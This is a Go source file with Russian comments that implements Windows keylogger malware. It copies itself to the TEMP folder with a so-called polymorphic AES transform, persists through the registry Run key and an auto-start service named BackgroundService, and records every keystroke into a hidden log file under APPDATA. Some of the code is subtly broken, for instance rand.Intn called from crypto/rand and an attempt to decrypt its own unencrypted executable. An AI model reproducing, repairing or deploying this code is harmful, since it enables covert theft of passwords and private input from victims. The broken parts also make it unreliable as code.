package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

const (
	serviceName = "BackgroundService"
	logFileName = "hidden.log"
	// Ключ шифрования (заменить на свой сгенерированный ключ)
	encryptionKey = "12345678901234567890123456789012" // 32-байтный ключ AES-256
)

// Шифрование данных с помощью AES-256
func encrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return ciphertext, nil
}

// Дешифрование данных с помощью AES-256
func decrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]

	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}

	return plaintext, nil
}

// Полиморфная функция для изменения кода программы (теперь с шифрованием)
func polymorphicTransform(code []byte) ([]byte, error) {
	encryptedCode, err := encrypt(code, []byte(encryptionKey))
	if err != nil {
		return nil, err
	}
	encoded := base64.StdEncoding.EncodeToString(encryptedCode)
	return []byte(encoded), nil
}

// Функция для создания копии программы
func selfCopy() {
	exePath, err := os.Executable()
	if err != nil {
		log.Println("Ошибка получения пути исполняемого файла:", err)
		return
	}

	tempDir := os.Getenv("TEMP")
	if tempDir == "" {
		tempDir = os.TempDir()
	}

	newExePath := filepath.Join(tempDir, "service.exe")
	data, err := ioutil.ReadFile(exePath)
	if err != nil {
		log.Println("Ошибка чтения исполняемого файла:", err)
		return
	}

	transformedData, err := polymorphicTransform(data)
	if err != nil {
		log.Println("Ошибка полиморфного преобразования:", err)
		return
	}

	decodedData, err := base64.StdEncoding.DecodeString(string(transformedData))
	if err != nil {
		log.Println("Ошибка декодирования:", err)
		return
	}

	err = ioutil.WriteFile(newExePath, decodedData, 0755)
	if err != nil {
		log.Println("Ошибка записи нового файла:", err)
		return
	}

	cmd := exec.Command(newExePath)
	cmd.Start()
}

// Функция для добавления в автозагрузку
func addToStartup() {
	exePath, err := os.Executable()
	if err != nil {
		log.Println("Ошибка получения пути исполняемого файла:", err)
		return
	}

	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		log.Println("Ошибка открытия ключа реестра:", err)
		return
	}
	defer k.Close()

	err = k.SetStringValue(serviceName, exePath)
	if err != nil {
		log.Println("Ошибка записи в реестр:", err)
		return
	}

	log.Println("Добавлено в автозагрузку")
}

// Функция для установки программы как службы
func installService() {
	serviceName := "BackgroundService"
	servicePath, _ := os.Executable()

	scm := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_CREATE_SERVICE)
	defer windows.CloseServiceHandle(scm)

	service, err := windows.CreateService(scm, windows.StringToUTF16Ptr(serviceName),
		windows.StringToUTF16Ptr(serviceName), windows.SERVICE_ALL_ACCESS,
		windows.SERVICE_WIN32_OWN_PROCESS, windows.SERVICE_AUTO_START,
		windows.SERVICE_ERROR_NORMAL, windows.StringToUTF16Ptr(servicePath),
		nil, nil, nil, nil)
	if err != nil {
		log.Println("Ошибка создания службы:", err)
		return
	}
	defer windows.CloseServiceHandle(service)

	err = windows.StartService(service, 0, nil)
	if err != nil {
		log.Println("Ошибка запуска службы:", err)
	}
}

// Функция для записи нажатий клавиш
func keylogger() {
	filePath := filepath.Join(os.Getenv("APPDATA"), logFileName)
	file, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		log.Println("Ошибка открытия файла:", err)
		return
	}
	defer file.Close()

	attr := windows.FileAttributeHidden
	err = windows.SetFileAttributes(syscall.StringToUTF16Ptr(filePath), attr)
	if err != nil {

		log.Println("Ошибка установки атрибута 'скрытый':", err)
	}

	user32 := windows.NewLazySystemDLL("user32.dll")
	getAsyncKeyState := user32.NewProc("GetAsyncKeyState")
	toUnicode := user32.NewProc("ToUnicode")

	writer := bufio.NewWriter(file)
	var mu sync.Mutex
	for {
		for i := uint8(0); i < 255; i++ {
			if getAsyncKeyState.Call(uintptr(i))&0x8000 != 0 {
				var keyName string
				switch i {
				case windows.VK_LSHIFT, windows.VK_RSHIFT:
					keyName = "[SHIFT]"
				case windows.VK_LCONTROL, windows.VK_RCONTROL:
					keyName = "[CTRL]"
				case windows.VK_LMENU, windows.VK_RMENU:
					keyName = "[ALT]"
				case windows.VK_CAPITAL:
					keyName = "[CAPS LOCK]"
				case windows.VK_TAB:
					keyName = "[TAB]"
				case windows.VK_RETURN:
					keyName = "[ENTER]"
				case windows.VK_BACK:
					keyName = "[BACKSPACE]"
				case windows.VK_SPACE:
					keyName = " "
				default:
					var keyboardState [256]byte
					getKeyboardState := user32.NewProc("GetKeyboardState")
					getKeyboardState.Call(uintptr(unsafe.Pointer(&keyboardState[0])))

					var chars [16]uint16
					vk := uintptr(i)
					scanCode := uintptr(windows.MapVirtualKey(uint32(i), windows.MAPVK_VK_TO_VSC))
					toUnicode.Call(vk, scanCode, uintptr(unsafe.Pointer(&keyboardState[0])), uintptr(unsafe.Pointer(&chars[0])), uintptr(16), uintptr(0))
					if chars[0] != 0 {
						keyName = syscall.UTF16ToString(chars[:])
					} else {
						keyName = "[VK:" + strconv.Itoa(int(i)) + "]"
					}
				}
				mu.Lock()
				_, err = writer.WriteString(keyName)
				mu.Unlock()
				if err != nil {
					log.Println("Ошибка записи в файл:", err)
				}
				mu.Lock()
				writer.Flush()
				mu.Unlock()

			}
		}
		time.Sleep(10 * time.Millisecond)
	}
}

// checkDuplicate проверяет, запущен ли уже экземпляр программы с именем "service.exe"
func checkDuplicate() bool {
	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		log.Println("Ошибка создания снимка процессов:", err)
		return false
	}
	defer windows.CloseHandle(snapshot)

	err = windows.Process32First(snapshot, &entry)
	if err != nil {
		log.Println("Ошибка получения первого процесса:", err)
		return false
	}

	for {
		if syscall.UTF16ToString(entry.ExeFile[:]) == "service.exe" && entry.ProcessID != uint32(os.Getpid()) {
			return true
		}

		err = windows.Process32Next(snapshot, &entry)
		if err != nil {
			if err == windows.ERROR_NO_MORE_FILES {
				return false
			}
			log.Println("Ошибка получения следующего процесса:", err)
			return false
		}
	}
}
func removeSelfCopy() {
	newExePath := filepath.Join(os.Getenv("TEMP"), "service.exe")
	err := os.Remove(newExePath)
	if err != nil {
		log.Println("Ошибка удаления:", newExePath, err)
		return
	}
	log.Println("Удалено:", newExePath)
}
// Основная функция
func main() {
	runtime.LockOSThread()
    time.Sleep(time.Duration(rand.Intn(5000)) * time.Millisecond)
	// Проверяем, запущена ли уже другая копия
	if !checkDuplicate() {
        
		selfCopy()
		addToStartup()
		installService()
        
        
        exePath, err := os.Executable()
        if err != nil {
            log.Println("Ошибка получения пути исполняемого файла:", err)
            return
        }
    
        data, err := ioutil.ReadFile(exePath)
        if err != nil {
            log.Println("Ошибка чтения исполняемого файла:", err)
            return
        }
    
        decryptedData, err := decrypt(data, []byte(encryptionKey))
        if err != nil {
            log.Println("Ошибка дешифрования:", err)
            return
        }

    	err = ioutil.WriteFile(exePath, decryptedData, 0755)
    	if err != nil {
    		log.Println("Ошибка записи нового файла:", err)
    		return
    	}
        
        
		keylogger()
	} else {
		log.Println("Другая копия уже запущена")
		os.Exit(0)
	}
    removeSelfCopy()
}
